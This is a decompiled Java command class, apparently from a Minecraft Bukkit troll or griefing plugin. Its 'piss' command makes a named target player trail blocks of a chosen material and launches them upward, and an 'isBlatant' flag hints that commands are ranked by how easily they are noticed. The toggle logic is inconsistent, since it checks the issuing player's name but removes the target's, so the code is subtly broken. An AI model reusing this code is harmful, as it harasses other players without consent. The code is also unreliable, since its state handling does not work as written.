/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.util.Vector
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

public class PissCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("piss <player> <block>"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else if (plugin.scaffoldingPlayers.contains(p2.getName())) {
                plugin.scaffoldingPlayers.remove(target.getName());
                target.setVelocity(new Vector(0.0, 0.5, 0.0));
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " is no longer pissing"));
            } else if (!plugin.scaffoldingPlayers.contains(p2.getName())) {
                if (args.length <= 2) {
                    p2.sendMessage(Settings.USAGE("piss <player> <block>"));
                    return;
                }
                try {
                    plugin.scaffoldMaterialMap.put(target, Material.valueOf((String)args[2].toUpperCase()));
                }
                catch (IllegalArgumentException e2) {
                    p2.sendMessage(Settings.PREFIX("The block " + Settings.RED + args[2] + Settings.WHITE + " was not found!"));
                    return;
                }
                plugin.scaffoldingPlayers.add(target.getName());
                target.setVelocity(new Vector(0.0, 0.5, 0.0));
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " is now pissing " + Settings.RED + args[2].toUpperCase()));
            } else {
                p2.sendMessage(Settings.USAGE("piss <player> <block>"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

